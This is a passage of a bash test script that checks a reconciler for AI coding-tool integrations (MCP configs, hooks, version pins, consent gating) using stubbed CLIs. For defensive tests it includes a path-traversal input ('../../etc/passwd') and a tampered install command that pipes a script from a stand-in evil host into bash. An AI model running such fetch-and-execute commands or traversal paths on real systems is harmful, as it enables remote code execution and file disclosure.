RT_PATCH_GRAPHIFY= RT_PATCH_LEANCTX= python3 "$REPO_ROOT/scripts/lib/global-toolstack/patch-mcp.py" >/dev/null 2>&1 || true
after="$(cat "${TMP_MCP_DEFAULT}/.cursor/mcp.json")"
[[ "$before" == "$after" ]] && pass "patch-mcp defaults fail-closed" || fail "patch-mcp defaults fail-closed"
export HOME="$TEST_HOME"

# graphify repair: RT_PATCH_LEANCTX=0 even when leanctx consented
TMP_GF_REPAIR="$(mktemp -d)"
export HOME="$TMP_GF_REPAIR"
mkdir -p "${TMP_GF_REPAIR}/.cursor"
printf '{"mcpServers":{}}\n' >"${TMP_GF_REPAIR}/.cursor/mcp.json"
jq '.recommended_tools.graphify.enabled_by_user = true
  | .recommended_tools.leanctx.enabled_by_user = true
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_GF_REPAIR/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_GF_REPAIR/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_GF_REPAIR/silver-bullet.md"
git -C "$TMP_GF_REPAIR" init -q
if command -v graphify-mcp >/dev/null 2>&1; then
  RT_PROJECT_ROOT="$TMP_GF_REPAIR" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix RT_REPO_ROOT="$REPO_ROOT" \
    bash -c 'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/common.sh"; rt_init_paths
    source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/repair-graphify.sh"
    rt_repair_graphify_mcp_config' 2>/dev/null || true
  if jq -e '.mcpServers.leanctx' "${TMP_GF_REPAIR}/.cursor/mcp.json" >/dev/null 2>&1; then
    fail "graphify repair skips leanctx MCP without RT_PATCH_LEANCTX"
  else
    pass "graphify repair skips leanctx MCP without RT_PATCH_LEANCTX"
  fi
else
  pass "graphify repair leanctx consent (graphify-mcp absent — skipped)"
fi
export HOME="$TEST_HOME"

# verify exits non-zero when repairable
verify_rc=0
bash "$RECONCILE" --project-root "$TMP_HB" --host cursor --mode verify --format json >/dev/null 2>&1 || verify_rc=$?
[[ "$verify_rc" -ne 0 ]] && pass "verify exits non-zero when not fully ready" || fail "verify exits non-zero when not fully ready"

# cross_tool batch: component repairs run optimize/install; patch-hooks/patch-mcp owned by cross_tool
TMP_DOUBLE="$(mktemp -d)"
export HOME="$TMP_DOUBLE"
mkdir -p "${TMP_DOUBLE}/.cursor"
mkdir -p "${TMP_DOUBLE}/bin"
cat >"${TMP_DOUBLE}/bin/lean-ctx" <<'EOF'
#!/usr/bin/env bash
case "${1:-}" in
  --version) printf 'lean-ctx test-stub 0.0.0\n' ;;
  init)
    [[ "${2:-}" == "--help" ]] && printf 'Usage: lean-ctx init\n'
    ;;
  proxy)
    [[ "${2:-}" == "--help" ]] && printf 'Usage: lean-ctx proxy\n'
    ;;
esac
EOF
chmod +x "${TMP_DOUBLE}/bin/lean-ctx"
export PATH="${TMP_DOUBLE}/bin:${PATH}"
printf '{"mcpServers":{}}\n' >"${TMP_DOUBLE}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[]}}\n' >"${TMP_DOUBLE}/.cursor/hooks.json"
jq '.recommended_tools.graphify.enabled_by_user = true
  | .recommended_tools.rtk.enabled_by_user = true
  | .recommended_tools.context_mode.enabled_by_user = true
  | .recommended_tools.leanctx.enabled_by_user = true
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_DOUBLE/.silver-bullet.json"
cp "$REPO_ROOT/silver-bullet.md" "$TMP_DOUBLE/silver-bullet.md" 2>/dev/null || printf '# SB\n' >"$TMP_DOUBLE/silver-bullet.md"
git -C "$TMP_DOUBLE" init -q
export RT_CROSS_TOOL_BATCH=1
leanctx_repair="$(RT_PROJECT_ROOT="$TMP_DOUBLE" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix RT_REPO_ROOT="$REPO_ROOT" \
  bash -c 'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/common.sh"; rt_init_paths
  source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/probe-leanctx.sh"
  rt_repair_leanctx' 2>/dev/null || true)"
rtk_repair="$(RT_PROJECT_ROOT="$TMP_DOUBLE" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix RT_REPO_ROOT="$REPO_ROOT" \
  bash -c 'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/common.sh"; rt_init_paths
  source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/probe-rtk.sh"
  rt_repair_rtk' 2>/dev/null || true)"
unset RT_CROSS_TOOL_BATCH
echo "$leanctx_repair" | jq -e '[.actions[]? | select(. == "install_leanctx_sb")] | length > 0' >/dev/null 2>&1 \
  && pass "leanctx repair runs install under cross_tool batch" || fail "leanctx repair runs install under cross_tool batch"
echo "$rtk_repair" | jq -e '[.actions[]? | select(. == "optimize_rtk_context_mode")] | length > 0' >/dev/null 2>&1 \
  && pass "rtk repair runs optimize under cross_tool batch" || fail "rtk repair runs optimize under cross_tool batch"
export HOME="$TEST_HOME"

TMP_INSTALL="$(mktemp -d)"
export HOME="$TEST_HOME"
# shellcheck source=../../scripts/lib/recommended-tools/installer.sh
source "$REPO_ROOT/scripts/lib/recommended-tools/installer.sh"
rt_deploy_reconciler_snapshots "$REPO_ROOT" >/dev/null 2>&1 || true
if [[ -f "${TEST_HOME}/.cursor/hooks/toolstack/lib/recommended-tools/common.sh" ]]; then
  pass "installer deploys lib/recommended-tools layout"
else
  fail "installer deploys lib/recommended-tools layout"
fi
for deployed in stack-compression-coordinator.sh graphify-gate.sh patch-hooks.py; do
  if [[ -f "${TEST_HOME}/.cursor/hooks/toolstack/${deployed}" ]]; then
    pass "installer deploys toolstack ${deployed}"
  else
    fail "installer deploys toolstack ${deployed}"
  fi
done

# Session id sanitization rejects path traversal in heartbeat paths
# shellcheck source=../../scripts/lib/recommended-tools/paths.sh
source "$REPO_ROOT/scripts/lib/recommended-tools/paths.sh"
safe="$(rt_sanitize_session_id 'valid-session_01')"
[[ "$safe" == "valid-session_01" ]] && pass "session id keeps safe chars" || fail "session id keeps safe chars"
unsafe="$(rt_sanitize_session_id '../../etc/passwd')"
[[ "$unsafe" != *"/"* && "$unsafe" != *".."* ]] \
  && pass "session id sanitizes path traversal" || fail "session id sanitizes path traversal"
hb_path="$(rt_heartbeat_path "proj" "wt" "../../evil")"
[[ "$hb_path" != *"/evil"* && "$hb_path" == *".json" ]] \
  && pass "heartbeat path uses sanitized session id" || fail "heartbeat path uses sanitized session id"

# Reentrancy: apply mode must not recurse through optimize/installer back into
# itself. Regression guard — the cycle reconcile -> optimize-rtk-context-mode ->
# install-recommended-tools-global -> install-recommended-tools-cursor ->
# reconcile previously spawned processes until the CI runner was reclaimed.
TMP_REENTRY="$(mktemp -d)"
TMP_REENTRY_HOME="$(mktemp -d)"
jq '.recommended_tools.graphify.enabled_by_user = true
  | .recommended_tools.agentmemory.enabled_by_user = true
  | .recommended_tools.rtk.enabled_by_user = true
  | .recommended_tools.context_mode.enabled_by_user = true
  | .recommended_tools.leanctx.enabled_by_user = true
  | .sb_initiated = true' "$TEMPLATE" >"$TMP_REENTRY/.silver-bullet.json"
printf '# SB\n' >"$TMP_REENTRY/silver-bullet.md"
git -C "$TMP_REENTRY" init -q
mkdir -p "${TMP_REENTRY_HOME}/.cursor"
printf '{"mcpServers":{}}\n' >"${TMP_REENTRY_HOME}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[{"command":"rtk hook cursor","matcher":"Shell"}]}}\n' >"${TMP_REENTRY_HOME}/.cursor/hooks.json"
reentry_rc=0
HOME="$TMP_REENTRY_HOME" timeout 120 bash "$RECONCILE" \
  --project-root "$TMP_REENTRY" --host cursor --mode apply --entry-point doctor-fix \
  --format json >/dev/null 2>&1 || reentry_rc=$?
[[ "$reentry_rc" -ne 124 ]] \
  && pass "apply with all tools consented terminates (no reconcile/installer recursion)" \
  || fail "apply with all tools consented terminates (no reconcile/installer recursion)"
rm -rf "$TMP_REENTRY" "$TMP_REENTRY_HOME"

# The guard itself: post-install must not re-enter the reconciler mid-apply
reentry_guard="$(SB_RT_APPLY_ACTIVE=1 bash -c \
  'source "'"$REPO_ROOT"'/scripts/lib/recommended-tools/installer.sh"
  rt_installer_post_install "'"$REPO_ROOT"'" "" 2>&1' || true)"
[[ "$reentry_guard" == *"SKIP: installer post-install reconcile"* ]] \
  && pass "post-install skips nested reconcile when apply active" \
  || fail "post-install skips nested reconcile when apply active"

# --- D10 five-tool default-path coverage ---
# Keep vendor doctor skipped for the historical cases above, then exercise it
# explicitly in this block.
export RT_SKIP_VENDOR_DOCTOR="${RT_SKIP_VENDOR_DOCTOR:-1}"

D10_HOME="$(mktemp -d)"
D10_PROJ="$(mktemp -d)"
D10_BIN="$(mktemp -d)"
mkdir -p "${D10_HOME}/.cursor"
export HOME="$D10_HOME"
cp "$TEMPLATE" "${D10_PROJ}/.silver-bullet.json"
printf '# SB\n' >"${D10_PROJ}/silver-bullet.md"
git -C "$D10_PROJ" init -q
printf '{"mcpServers":{}}\n' >"${D10_HOME}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[]}}\n' >"${D10_HOME}/.cursor/hooks.json"

d10_enable() {
  local tool="$1"
  jq --arg t "$tool" '.recommended_tools[$t].enabled_by_user = true | .sb_initiated = true' \
    "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
  mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
}

d10_probe() {
  local script="$1"
  local fn="$2"
  local host="${3:-cursor}"
  RT_PROJECT_ROOT="$D10_PROJ" RT_HOST="$host" RT_MODE=verify RT_REPO_ROOT="$REPO_ROOT" \
    HOME="$D10_HOME" PATH="${D10_BIN}:${PATH}" \
    bash -c '
      set -euo pipefail
      # shellcheck source=/dev/null
      source "$1/scripts/lib/recommended-tools/common.sh"
      rt_init_paths
      # shellcheck source=/dev/null
      source "$1/scripts/lib/recommended-tools/'"$script"'"
      '"$fn"'
    ' _ "$REPO_ROOT"
}

# Graphify: CLI + graphify-mcp present, MCP server key missing
d10_enable graphify
printf '#!/usr/bin/env bash\nexit 0\n' >"${D10_BIN}/graphify"
printf '#!/usr/bin/env bash\nexit 0\n' >"${D10_BIN}/graphify-mcp"
chmod +x "${D10_BIN}/graphify" "${D10_BIN}/graphify-mcp"
gfy_json="$(d10_probe probe-graphify.sh rt_probe_graphify 2>/dev/null || true)"
echo "$gfy_json" | jq -e '.evidence | index("mcp_not_configured") != null' >/dev/null 2>&1 \
  && pass "D10 graphify FAILs when MCP server missing" \
  || fail "D10 graphify FAILs when MCP server missing (${gfy_json:-empty})"

# agentmemory: CLI present, health endpoint down
d10_enable agentmemory
printf '#!/usr/bin/env bash\nexit 0\n' >"${D10_BIN}/agentmemory"
chmod +x "${D10_BIN}/agentmemory"
am_json="$(d10_probe probe-agentmemory.sh rt_probe_agentmemory 2>/dev/null || true)"
echo "$am_json" | jq -e '.evidence | (index("server_unhealthy") != null or index("cli_missing") != null or index("mcp_not_configured") != null)' >/dev/null 2>&1 \
  && pass "D10 agentmemory FAILs when health is down" \
  || fail "D10 agentmemory FAILs when health is down (${am_json:-empty})"

# RTK: CLI looks valid, cursor hook missing
d10_enable rtk
cat >"${D10_BIN}/rtk" <<'EOF'
#!/usr/bin/env bash
case "$1" in
  gain) exit 0 ;;
  --version) echo "rtk 0.42.0"; exit 0 ;;
  doctor) echo "no doctor"; exit 2 ;;
  --help) echo "rtk hook helper"; exit 0 ;;
  *) exit 0 ;;
esac
EOF
chmod +x "${D10_BIN}/rtk"
rtk_json="$(d10_probe probe-rtk.sh rt_probe_rtk 2>/dev/null || true)"
echo "$rtk_json" | jq -e '.evidence | index("shell_hook_missing") != null' >/dev/null 2>&1 \
  && pass "D10 rtk FAILs when cursor hook missing" \
  || fail "D10 rtk FAILs when cursor hook missing (${rtk_json:-empty})"

# LeanCTX: duplicate leanctx + lean-ctx MCP keys
d10_enable leanctx
printf '#!/usr/bin/env bash\nexit 0\n' >"${D10_BIN}/lean-ctx"
chmod +x "${D10_BIN}/lean-ctx"
cat >"${D10_HOME}/.cursor/mcp.json" <<'EOF'
{
  "mcpServers": {
    "leanctx": {
      "command": "lean-ctx",
      "env": {
        "LEANCTX_MCP_TOOL_PREFIX": "lctx_",
        "LEANCTX_DISABLE_SHELL_MCP": "1",
        "LEANCTX_DISABLE_SANDBOX_MCP": "1",
        "LEANCTX_DISABLE_FETCH_MCP": "1",
        "LEANCTX_DISABLE_FTS": "1"
      }
    },
    "lean-ctx": { "command": "lean-ctx" }
  }
}
EOF
lc_json="$(d10_probe probe-leanctx.sh rt_probe_leanctx 2>/dev/null || true)"
echo "$lc_json" | jq -e '.evidence | index("duplicate_mcp_keys") != null' >/dev/null 2>&1 \
  && pass "D10 leanctx FAILs on duplicate leanctx+lean-ctx MCP keys" \
  || fail "D10 leanctx FAILs on duplicate MCP keys (${lc_json:-empty})"

# Context Mode: vendor doctor on the default (non --deep) path
unset RT_SKIP_VENDOR_DOCTOR
d10_enable context_mode
printf '{"mcpServers":{"context-mode":{"command":"context-mode"}}}\n' >"${D10_HOME}/.cursor/mcp.json"
cat >"${D10_PROJ}/silver-bullet.md" <<'EOF'
# SB
<!-- BEGIN context-mode hint (do not edit) -->
Use ctx_execute, ctx_index, ctx_search, ctx_batch_execute instead of raw dumps.
<!-- END context-mode hint (do not edit) -->
EOF
CM_STAMP="${D10_HOME}/cm-doctor.stamp"
: >"$CM_STAMP"
cat >"${D10_BIN}/context-mode" <<EOF
#!/usr/bin/env bash
if [[ "\$1" == "doctor" ]]; then
  echo invoked >> "${CM_STAMP}"
  exit \${CM_DOCTOR_RC:-0}
fi
exit 0
EOF
chmod +x "${D10_BIN}/context-mode"
export CM_DOCTOR_RC=1
cm_json="$(d10_probe probe-context-mode.sh rt_probe_context_mode 2>/dev/null || true)"
echo "$cm_json" | jq -e '.evidence | index("vendor_doctor_failed") != null' >/dev/null 2>&1 \
  && pass "D10 context_mode FAILs when vendor doctor fails on default path" \
  || fail "D10 context_mode FAILs when vendor doctor fails (${cm_json:-empty})"
if grep -q invoked "$CM_STAMP"; then
  pass "D10 context-mode doctor invoked without --deep"
else
  fail "D10 context-mode doctor invoked without --deep"
fi
export CM_DOCTOR_RC=0
: >"$CM_STAMP"
cm_ok="$(d10_probe probe-context-mode.sh rt_probe_context_mode 2>/dev/null || true)"
echo "$cm_ok" | jq -e '.evidence | index("vendor_doctor_failed") == null' >/dev/null 2>&1 \
  && pass "D10 context_mode passes vendor doctor on default path" \
  || fail "D10 context_mode passes vendor doctor (${cm_ok:-empty})"
# Alumnium: not opted in → N/A (pending/disabled), not FAIL
jq '.recommended_tools.alumnium.enabled_by_user = null' \
  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
alu_na="$(d10_probe probe-alumnium.sh rt_probe_alumnium 2>/dev/null || true)"
echo "$alu_na" | jq -e '.canonical_state == "pending" or .canonical_state == "disabled"' >/dev/null 2>&1 \
  && pass "D10 alumnium PASSes N/A when not opted in" \
  || fail "D10 alumnium PASSes N/A when not opted in (${alu_na:-empty})"

# Alumnium: opted in, CLI missing
d10_enable alumnium
alu_cli="$(d10_probe probe-alumnium.sh rt_probe_alumnium 2>/dev/null || true)"
echo "$alu_cli" | jq -e '.evidence | index("cli_missing") != null' >/dev/null 2>&1 \
  && pass "D10 alumnium FAILs when CLI missing" \
  || fail "D10 alumnium FAILs when CLI missing (${alu_cli:-empty})"

# Alumnium: CLI present, MCP missing
printf '#!/usr/bin/env bash\nexit 0\n' >"${D10_BIN}/alumnium"
chmod +x "${D10_BIN}/alumnium"
printf '{"mcpServers":{}}\n' >"${D10_HOME}/.cursor/mcp.json"
alu_mcp="$(d10_probe probe-alumnium.sh rt_probe_alumnium 2>/dev/null || true)"
echo "$alu_mcp" | jq -e '.evidence | index("mcp_not_configured") != null' >/dev/null 2>&1 \
  && pass "D10 alumnium FAILs when MCP server missing" \
  || fail "D10 alumnium FAILs when MCP server missing (${alu_mcp:-empty})"

# Alumnium: vendor doctor FAIL on default path
unset RT_SKIP_VENDOR_DOCTOR
printf '{"mcpServers":{"alumnium":{"command":"npx","args":["-y","alumnium","mcp"]}}}\n' >"${D10_HOME}/.cursor/mcp.json"
ALU_STAMP="${D10_HOME}/alu-doctor.stamp"
: >"$ALU_STAMP"
cat >"${D10_BIN}/alumnium" <<EOF
#!/usr/bin/env bash
if [[ "\$1" == "doctor" ]]; then
  echo invoked >> "${ALU_STAMP}"
  exit \${ALU_DOCTOR_RC:-0}
fi
exit 0
EOF
chmod +x "${D10_BIN}/alumnium"
export ALU_DOCTOR_RC=1
alu_vd="$(d10_probe probe-alumnium.sh rt_probe_alumnium 2>/dev/null || true)"
echo "$alu_vd" | jq -e '.evidence | index("vendor_doctor_failed") != null' >/dev/null 2>&1 \
  && pass "D10 alumnium FAILs when vendor doctor fails on default path" \
  || fail "D10 alumnium FAILs when vendor doctor fails (${alu_vd:-empty})"
export ALU_DOCTOR_RC=0
alu_ok="$(d10_probe probe-alumnium.sh rt_probe_alumnium 2>/dev/null || true)"
echo "$alu_ok" | jq -e '.evidence | index("vendor_doctor_failed") == null' >/dev/null 2>&1 \
  && pass "D10 alumnium passes vendor doctor on default path" \
  || fail "D10 alumnium passes vendor doctor (${alu_ok:-empty})"

# --- Wave 1: search_cli extra-tool (Alumnium consent pattern, not Cursor-only) ---
# shellcheck source=../../scripts/lib/recommended-tools/common.sh
source "$REPO_ROOT/scripts/lib/recommended-tools/common.sh"
rt_init_paths
# shellcheck source=../../hooks/lib/recommended-tools-registry.sh
source "$REPO_ROOT/hooks/lib/recommended-tools-registry.sh"

printf '%s\n' "${RT_COMPONENT_IDS[@]}" | grep -qx search_cli \
  && pass "RT_COMPONENT_IDS includes search_cli" \
  || fail "RT_COMPONENT_IDS includes search_cli"

printf '%s\n' "${SB_RECOMMENDED_TOOL_IDS[@]}" | grep -qx search_cli \
  && pass "registry SB_RECOMMENDED_TOOL_IDS includes search_cli" \
  || fail "registry SB_RECOMMENDED_TOOL_IDS includes search_cli"

[[ "$(sb_recommended_tool_display_name search_cli)" == "search-cli" ]] \
  && pass "registry display name for search_cli" \
  || fail "registry display name for search_cli ($(sb_recommended_tool_display_name search_cli))"

pin_json="$(sb_recommended_tool_install_pin search_cli 2>/dev/null || true)"
echo "$pin_json" | jq -e '.version == "0.9.0" and (.brew_tap | test("paperfoot")) and (.docs_pin | test("v0.9.0")) and (.argv_digest | length > 0)' >/dev/null 2>&1 \
  && pass "registry F6 pin for search_cli is versioned brew 0.9.0" \
  || fail "registry F6 pin for search_cli is versioned brew 0.9.0 (${pin_json:-empty})"

RT_SCOPE=packages rt_scope_includes_component search_cli \
  && pass "packages scope includes search_cli" \
  || fail "packages scope includes search_cli"
RT_SCOPE=project rt_scope_includes_component search_cli \
  && fail "project scope excludes search_cli" \
  || pass "project scope excludes search_cli"
RT_SCOPE=host rt_scope_includes_component search_cli \
  && fail "host scope excludes search_cli" \
  || pass "host scope excludes search_cli"

if grep -q 'rt_any_five_tool_mutation_allowed' "$REPO_ROOT/scripts/lib/recommended-tools/common.sh" \
  && grep -A8 'rt_any_five_tool_mutation_allowed()' "$REPO_ROOT/scripts/lib/recommended-tools/common.sh" | grep -q search_cli; then
  fail "search_cli must not join rt_any_five_tool_mutation_allowed"
else
  pass "search_cli must not join rt_any_five_tool_mutation_allowed"
fi

if grep -q 'source "${RT_LIB}/probe-search_cli.sh"' "$REPO_ROOT/scripts/reconcile-recommended-tools.sh" \
  && grep -q 'rt_run_component search_cli' "$REPO_ROOT/scripts/reconcile-recommended-tools.sh"; then
  pass "reconciler sources and runs search_cli"
else
  fail "reconciler sources and runs search_cli"
fi

cp "$TEMPLATE" "${D10_PROJ}/.silver-bullet.json"
jq '.sb_initiated = true | .recommended_tools.search_cli.enabled_by_user = null' \
  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
sc_na="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
echo "$sc_na" | jq -e '.canonical_state == "pending" or .canonical_state == "disabled"' >/dev/null 2>&1 \
  && pass "D10 search_cli PASSes N/A when not opted in" \
  || fail "D10 search_cli PASSes N/A when not opted in (${sc_na:-empty})"
echo "$sc_na" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
  && fail "D10 search_cli must not FAIL when not opted in" \
  || pass "D10 search_cli must not FAIL when not opted in"

jq '.recommended_tools.search_cli.enabled_by_user = true | .recommended_tools.search_cli.required_when_enabled = false' \
  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
if sb_recommended_tool_enforced "${D10_PROJ}/.silver-bullet.json" search_cli; then
  fail "search_cli required_when_enabled false skips hook enforcement"
else
  pass "search_cli required_when_enabled false skips hook enforcement"
fi

d10_enable search_cli
rm -f "${D10_BIN}/search"
for sc_host in cursor claude codex; do
  sc_cli="$(d10_probe probe-search_cli.sh rt_probe_search_cli "$sc_host" 2>/dev/null || true)"
  echo "$sc_cli" | jq -e '.evidence | index("missing_cli") != null' >/dev/null 2>&1 \
    && echo "$sc_cli" | jq -e '.canonical_state != "unsupported" and .canonical_state != "pending"' >/dev/null 2>&1 \
    && pass "D10 search_cli FAILs missing CLI on ${sc_host}" \
    || fail "D10 search_cli FAILs missing CLI on ${sc_host} (${sc_cli:-empty})"
done

cat >"${D10_BIN}/search" <<'EOF'
#!/usr/bin/env bash
exit 1
EOF
chmod +x "${D10_BIN}/search"
sc_nover="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
echo "$sc_nover" | jq -e '.canonical_state != "ready"' >/dev/null 2>&1 \
  && pass "D10 search_cli PATH without version is not Health" \
  || fail "D10 search_cli PATH without version is not Health (${sc_nover:-empty})"

cat >"${D10_BIN}/search" <<'EOF'
#!/usr/bin/env bash
if [[ "${1:-}" == "--version" ]]; then echo "search 0.9.0"; exit 0; fi
if [[ "${1:-}" == "config" && "${2:-}" == "check" ]]; then echo "providers: none"; exit 0; fi
echo "SECRET_KEY=sk-live-should-never-appear"
exit 0
EOF
chmod +x "${D10_BIN}/search"
sc_prov="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
echo "$sc_prov" | jq -e '.canonical_state == "ready" and (.evidence | index("provider_missing") != null)' >/dev/null 2>&1 \
  && pass "D10 search_cli provider_missing WARN on ready Health" \
  || fail "D10 search_cli provider_missing WARN on ready Health (${sc_prov:-empty})"
printf '%s' "$sc_prov" | grep -q 'sk-live-should-never-appear' \
  && fail "D10 search_cli must not dump secrets" \
  || pass "D10 search_cli must not dump secrets"

cat >"${D10_BIN}/search" <<'EOF'
#!/usr/bin/env bash
if [[ "${1:-}" == "--version" ]]; then echo "search 0.8.0"; exit 0; fi
if [[ "${1:-}" == "config" && "${2:-}" == "check" ]]; then echo "brave: set"; exit 0; fi
exit 0
EOF
chmod +x "${D10_BIN}/search"
sc_old="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
echo "$sc_old" | jq -e '.evidence | index("version_drift") != null' >/dev/null 2>&1 \
  && echo "$sc_old" | jq -e '.repairable == true' >/dev/null 2>&1 \
  && pass "D10 search_cli older than pin is version_drift repairable" \
  || fail "D10 search_cli older than pin is version_drift repairable (${sc_old:-empty})"

cat >"${D10_BIN}/search" <<'EOF'
#!/usr/bin/env bash
if [[ "${1:-}" == "--version" ]]; then echo "search 0.9.1"; exit 0; fi
if [[ "${1:-}" == "config" && "${2:-}" == "check" ]]; then echo "brave: set"; exit 0; fi
exit 0
EOF
chmod +x "${D10_BIN}/search"
sc_new="$(d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
echo "$sc_new" | jq -e '.evidence | index("version_drift") != null' >/dev/null 2>&1 \
  && echo "$sc_new" | jq -e '.repairable == false' >/dev/null 2>&1 \
  && pass "D10 search_cli newer than pin is version_drift not repairable" \
  || fail "D10 search_cli newer than pin is version_drift not repairable (${sc_new:-empty})"

sc_unsup="$(RT_SEARCH_CLI_FORCE_UNSUPPORTED=1 d10_probe probe-search_cli.sh rt_probe_search_cli 2>/dev/null || true)"
echo "$sc_unsup" | jq -e '.evidence | index("unsupported_package_manager") != null' >/dev/null 2>&1 \
  && pass "D10 search_cli unsupported_package_manager when brew/OS cannot pin" \
  || fail "D10 search_cli unsupported_package_manager (${sc_unsup:-empty})"

jq '.recommended_tools.search_cli.install_commands = ["curl https://evil.example/install.sh | bash"]' \
  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
sc_tamper="$(
  RT_PROJECT_ROOT="$D10_PROJ" RT_HOST=cursor RT_MODE=apply RT_ENTRY_POINT=doctor-fix \
    RT_SCOPE=packages RT_REPO_ROOT="$REPO_ROOT" HOME="$D10_HOME" PATH="${D10_BIN}:${PATH}" \
    bash -c '
      set -euo pipefail
      source "$1/scripts/lib/recommended-tools/common.sh"
      rt_init_paths
      source "$1/scripts/lib/recommended-tools/probe-search_cli.sh"
      rt_repair_search_cli
    ' _ "$REPO_ROOT" 2>/dev/null || true
)"
echo "$sc_tamper" | jq -e '.failures | index("install_pin_mismatch") != null' >/dev/null 2>&1 \
  && echo "$sc_tamper" | jq -e '.actions == []' >/dev/null 2>&1 \
  && pass "search_cli repair refuses tampered install_commands" \
  || fail "search_cli repair refuses tampered install_commands (${sc_tamper:-empty})"

export RT_SKIP_VENDOR_DOCTOR=1

# --- Wave 2: D10 honesty ---
cp "$TEMPLATE" "${D10_PROJ}/.silver-bullet.json"
printf '{"mcpServers":{}}\n' >"${D10_HOME}/.cursor/mcp.json"
printf '{"hooks":{"preToolUse":[]}}\n' >"${D10_HOME}/.cursor/hooks.json"
export HOME="$D10_HOME"

# RTK min_version below pin is FAIL (version_mismatch + min_version)
d10_enable rtk
cat >"${D10_BIN}/rtk" <<'EOF'
#!/usr/bin/env bash
case "$1" in
  gain) exit 0 ;;
  --version) echo "rtk 0.1.0"; exit 0 ;;
  doctor) echo "no doctor"; exit 2 ;;
  --help) echo "rtk hook helper"; exit 0 ;;
  *) exit 0 ;;
esac
EOF
chmod +x "${D10_BIN}/rtk"
rtk_min="$(d10_probe probe-rtk.sh rt_probe_rtk 2>/dev/null || true)"
echo "$rtk_min" | jq -e '.evidence | index("min_version") != null' >/dev/null 2>&1 \
  && echo "$rtk_min" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
  && pass "D10 rtk below pin FAILs min_version" \
  || fail "D10 rtk below pin FAILs min_version (${rtk_min:-empty})"

# Context Mode: docs pin is min_node_version 22.5 — bump pin to force min_version FAIL
d10_enable context_mode
jq '.recommended_tools.context_mode.min_node_version = "99.0"' \
  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"
cm_min="$(d10_probe probe-context-mode.sh rt_probe_context_mode 2>/dev/null || true)"
echo "$cm_min" | jq -e '.evidence | (index("min_version") != null or index("node_version") != null)' >/dev/null 2>&1 \
  && echo "$cm_min" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
  && pass "D10 context_mode below node pin FAILs min_version" \
  || fail "D10 context_mode below node pin FAILs min_version (${cm_min:-empty})"
jq 'del(.recommended_tools.context_mode.min_node_version)' \
  "${D10_PROJ}/.silver-bullet.json" >"${D10_PROJ}/.silver-bullet.json.tmp"
mv "${D10_PROJ}/.silver-bullet.json.tmp" "${D10_PROJ}/.silver-bullet.json"

# LeanCTX min_version below 3.9.9
d10_enable leanctx
cat >"${D10_BIN}/lean-ctx" <<'EOF'
#!/usr/bin/env bash
if [[ "${1:-}" == "--version" ]]; then echo "lean-ctx 3.0.0"; exit 0; fi
exit 0
EOF
chmod +x "${D10_BIN}/lean-ctx"
lc_min="$(d10_probe probe-leanctx.sh rt_probe_leanctx 2>/dev/null || true)"
echo "$lc_min" | jq -e '.evidence | index("min_version") != null' >/dev/null 2>&1 \
  && echo "$lc_min" | jq -e '.canonical_state == "failed" or .canonical_state == "repairable"' >/dev/null 2>&1 \
  && pass "D10 leanctx below pin FAILs min_version" \
  || fail "D10 leanctx below pin FAILs min_version (${lc_min:-empty})"

# Vendor skip recorded; skip is not Health by itself (missing hook still FAIL)
export RT_SKIP_VENDOR_DOCTOR=1
d10_enable rtk
cat >"${D10_BIN}/rtk" <<'EOF'
#!/usr/bin/env bash
case "$1" in
  gain) exit 0 ;;
  --version) echo "rtk 0.42.0"; exit 0 ;;
  doctor) echo skipped; exit 2 ;;
  --help) echo "rtk hook helper"; exit 0 ;;
  *) exit 0 ;;
esac
EOF
chmod +x "${D10_BIN}/rtk"
printf '{"hooks":{"preToolUse":[]}}\n' >"${D10_HOME}/.cursor/hooks.json"
rtk_skip_fail="$(d10_probe probe-rtk.sh rt_probe_rtk 2>/dev/null || true)"
echo "$rtk_skip_fail" | jq -e '.evidence | index("shell_hook_missing") != null' >/dev/null 2>&1 \
